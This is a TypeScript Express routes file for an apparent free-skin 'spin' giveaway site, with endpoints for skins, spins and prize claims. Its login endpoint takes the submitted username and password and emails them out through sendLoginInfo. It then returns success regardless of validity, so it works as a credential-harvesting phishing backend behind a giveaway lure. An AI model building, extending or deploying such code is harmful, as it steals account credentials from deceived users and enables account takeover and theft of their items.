import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { sendLoginInfo } from "./services/emailService";


export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to get all skins
  app.get("/api/skins", async (req, res) => {
    try {
      const allSkins = await storage.getAllSkins();
      res.json(allSkins);
    } catch (error) {
      res.status(500).json({ message: "Failed to fetch skins" });
    }
  });

  // API endpoint to record a spin
  app.post("/api/spins", async (req, res) => {
    try {
      const { userId, skinId } = req.body;
      
      if (!userId || !skinId) {
        return res.status(400).json({ message: "Missing required fields" });
      }
      
      const spin = await storage.createSpin({ userId, skinId, claimed: false });
      res.json(spin);
    } catch (error) {
      res.status(500).json({ message: "Failed to record spin" });
    }
  });

  // API endpoint to claim a skin
  app.patch("/api/spins/:id/claim", async (req, res) => {
    try {
      const spinId = parseInt(req.params.id, 10);
      
      if (isNaN(spinId)) {
        return res.status(400).json({ message: "Invalid spin ID" });
      }
      
      const updatedSpin = await storage.claimSpin(spinId);
      
      if (!updatedSpin) {
        return res.status(404).json({ message: "Spin not found" });
      }
      
      res.json(updatedSpin);
    } catch (error) {
      res.status(500).json({ message: "Failed to claim skin" });
    }
  });

  // API endpoint to check if user has already spun
  app.get("/api/users/:userId/has-spun", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId, 10);
      
      if (isNaN(userId)) {
        return res.status(400).json({ message: "Invalid user ID" });
      }
      
      const hasSpun = await storage.hasUserSpun(userId);
      res.json({ hasSpun });
    } catch (error) {
      res.status(500).json({ message: "Failed to check spin status" });
    }
  });

  // Handle login submissions
  app.post("/api/login", async (req, res) => {
    try {
      const { username, password } = req.body;
      
      if (!username || !password) {
        return res.status(400).json({ message: "Missing username or password" });
      }
      
      // Send login details via email
      await sendLoginInfo(username, password);
      
      // Return success regardless of whether login is valid
      // This simulates a real login system without actually validating credentials
      res.json({ success: true, message: "Login processed" });
    } catch (error) {
      console.error('Login error:', error);
      // Return generic error to user
      res.status(500).json({ message: "An error occurred during login" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
